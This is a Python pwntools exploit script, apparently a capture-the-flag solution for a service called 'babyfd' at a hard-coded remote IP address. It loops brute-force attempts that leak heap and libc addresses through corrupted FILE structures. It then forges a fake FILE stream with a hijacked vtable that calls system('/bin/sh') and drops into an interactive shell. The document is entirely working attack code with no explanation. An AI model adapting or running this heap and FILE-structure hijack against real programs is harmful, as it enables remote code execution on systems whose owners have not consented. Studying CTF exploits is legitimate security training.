from pwn import *

def alloc(name):
	r.recvuntil("choice:")
	r.sendline("1")
	r.recvuntil(":")
	r.sendline(name)

def read_a(index, size, dat):
	r.recvuntil("choice:")
	r.sendline("2")
	r.recvuntil(":")
	r.sendline(str(index))
	r.recvuntil(":")
	r.sendline(str(size))
	r.sendline(dat) # stdin

def read_l(index, size):
	r.recvuntil("choice:")
	r.sendline("2")
	r.recvuntil(":")
	r.sendline(str(index))
	r.recvuntil(":")
	r.sendline(str(size))

def write(index):
	r.recvuntil("choice:")
	r.sendline("3")
	r.recvuntil(":")
	r.sendline(str(index))

def close_l(index):
	r.recvuntil("choice:")
	r.sendline("4")
	r.recvuntil(":")
	r.sendline(str(index))

for i in range(0, 0x100):
	try:
#		r = process("./babyfd")
#		r = remote("localhost", 50216)
		r = remote("52.198.183.186", 50216)

		sleep(0.1)

		r.recvuntil("choice:")
	        r.sendline("1")
	        r.sendline("/dev/fd/0")

		alloc("/etc/passwd")
		
		data = "A"*0x18
		data += p64(0x231)
		data += p64(0xfbad2488)

		read_a(0, len(data)+1, data+"\x98") # partial overwrite, brute-force 1/16 for null-byte
		read_l(1, 1)

		write(1)

		r.recvuntil("content of")
		r.recvuntil("\n")
		heap = ""
		heap += (r.recvuntil("Your choice: ")[0])
		r.sendline("9")
		
		print "heap leak..."

		for i in range(1, 6):
			r.sendline("9")
			close_l(1)
			alloc("/etc/passwd")
			read_a(0, len(data)+1, data[1:] + p8(0x98+i)) # partial overwrite
			read_l(1, 1)
			write(1)
			r.recvuntil("content of")
			r.recvuntil("\n")
			heap += (r.recvuntil("Your choice: ")[0])
		
		heap = u64(heap + "\x00\x00") - 0xf0
		log.info("Heap: 0x%x" % heap)

		r.sendline("9")

		close_l(1)

		data = "A"*0x17
		data += p64(0x231)
		data += p64(0xfbad2488)
		
		alloc("/etc/passwd")
		
		read_a(0, len(data)+7, data+p64(heap+0x78)[:-1])
		read_l(1, 1)
		write(1)

		r.recvuntil("content of")
		r.recvuntil("\n")
		libc = ""
		libc += (r.recvuntil("Your choice: ")[0])

		r.sendline("9")
		close_l(1)

		for i in range(1, 6):
			print hexdump(libc)
			alloc("/etc/passwd")
			read_a(0, len(data)+7, data[1:]+p64(heap+0x78+i)[:-1])
			read_l(1, 1)
			write(1)

			r.recvuntil("content of")
			r.recvuntil("\n")
			libc += (r.recvuntil("Your choice: ")[0])
			r.sendline("9")
			close_l(1)

		libc = u64(libc + "\x00\x00") - 0x3c2520
		log.info("Libc: 0x%x" % libc)

		alloc("/dev/fd/0")
		read_a(1, 16, "B"*16)

		alloc("/dev/fd/0")

		close_l(0)

		### stage-1 ###

		payload = "A"*23 + p64(0x231)
		payload += p64(0x20646d65fbad3c80)
		payload += p64(heap+0x1f8-0xa0)*5 # _IO_read_ptr, _IO_read_end, _IO_read_base, _IO_write_base, _IO_write_ptr
		payload += p64(heap+0x235) # _IO_write_end, no NULL Byte if _IO_write_end setted.
		payload += p64(heap+0x1f8-0xa0) # _IO_buf_base
		payload += p64(heap+0x235) # _IO_buf_end

		read_a(1, len(payload)+1, payload)

                vtable = libc + 0x3bdbd0 - 0x18
                system = libc + 0x456a0

                fake = "/bin/sh\x00"
                fake += "\x00"*0x98
		fake += p64(heap+0x1f8) # [buf+0xa0]
		fake += p64(heap+0x1f8)
		fake += p64(0x0)*2 # [[buf+0xa0]+0x18]
		fake += p64(0x1)*2 # [[buf+0xa0]+0x20] to bypass _IO_flush_all_lockp condition
                fake += p64(heap+0x158) # this is for argument, it points &"/bin/sh" in heap
                fake += p64(vtable)[:5] # changed vtable, sub_748E0

		read_a(2, len(fake)-1, fake[:-1]) # attempt 1
		read_a(2, len(fake), fake) # have to try two attempt for no NULL-Byte added

		### stage-2 ###

		payload = "A"*23 + p64(0x231)
                payload += p64(0x20646d65fbad3c80)
                payload += p64(heap+0x240)*5 # to overwrite second libc ptr
                payload += p64(heap+0x245)
                payload += p64(heap+0x240)
                payload += p64(heap+0x245)

		read_a(1, len(payload)+1, payload)

		read_a(2, 4, "AAAA")
                read_a(2, 5, p64(system)[:5]) # change second libc ptr to system

		### final stage ### 

		payload = "A"*23 + p64(0x231)
		payload += "\x80\x3c\xad\xfb\x3b\x73\x68\x00"
		payload += p64(heap+0x240)*5
                payload += p64(heap+0x245)
                payload += p64(heap+0x240)
                payload += p64(heap+0x245)
		payload += p64(0x0)*4
		payload += p64(heap+0x1f8-0xa0) # overwrite next ptr, it points fake stream pointer

		read_a(1, len(payload)+1, payload) # go!

		close_l(2) # call vtable and get shell

		r.interactive()
	except Exception as e:
		print e.message
		r.close()
		continue

